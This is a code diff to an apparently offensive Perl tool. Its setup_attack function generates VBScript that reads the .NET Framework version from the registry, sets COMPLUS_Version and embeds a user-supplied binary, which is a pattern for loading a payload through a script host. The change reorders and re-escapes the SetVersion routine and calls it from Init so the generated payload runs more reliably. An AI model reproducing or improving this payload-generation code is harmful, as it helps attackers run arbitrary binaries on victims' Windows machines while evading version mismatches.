@@ -467,24 +467,28 @@ sub setup_attack {
 
 		#$data = $insert;
 
-		$data = $data . "Sub SetVersion\r\n";
-		$data = $data . "Dim shell\r\n";
-		$data = $data . "Set shell = CreateObject(\\"WScript.Shell\\")\r\n";
-		$data = $data . "Dim ver\r\n";
-		$data = $data . "ver = \\"v4.0.30319\\"\r\n";
-		$data = $data . "On Error Resume Next\r\n";
-		$data = $data . "shell.RegRead \\"HKLM\\SOFTWARE\\\\Microsoft\\.NETFramework\\v4.0.30319\\\\"\r\n";
-		$data = $data . "If Err.Number <> 0 Then\r\n";
-		$data = $data . "  ver = \\"v2.0.50727\\"\r\n";
-		$data = $data . "  Err.Clear\r\n";
-		$data = $data . "End If\r\n";
-		$data = $data . "shell.Environment(\\"Process\\").Item(\\"COMPLUS_Version\\") = ver\r\n";
-		$data = $data . "End Sub\r\n";
+		
 
 		$data = $data . "Public binary As String\r\n";
 		$data = $data . "Public code As String\r\n";
+
+		$data = $data . "Sub SetVersion\r\n";
+		$data = $data . "Dim shell\r\n";
+		$data = $data . "Set shell = CreateObject(\"WScript.Shell\")\r\n";
+		$data = $data . "Dim ver\r\n";
+		$data = $data . "ver = \"v4.0.30319\"\r\n";
+		$data = $data . "On Error Resume Next\r\n";
+		$data = $data . "shell.RegRead \"HKLM\\\\SOFTWARE\\\\\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319\"\r\n";
+		$data = $data . "If Err.Number <> 0 Then\r\n";
+		$data = $data . "  ver = \"v2.0.50727\"\r\n";
+		$data = $data . "  Err.Clear\r\n";
+		$data = $data . "End If\r\n";
+		$data = $data . "shell.Environment(\"Process\").Item(\"COMPLUS_Version\") = ver\r\n";
+		$data = $data . "End Sub\r\n";
+
 		$data = $data . "Sub Init()\r\n";
 
+		$data = $data . "	SetVersion\r\n";
 		# Insert binary here		
 		$data = $data . "    binary = \"". %options["binary"] . "\"\r\n";
 
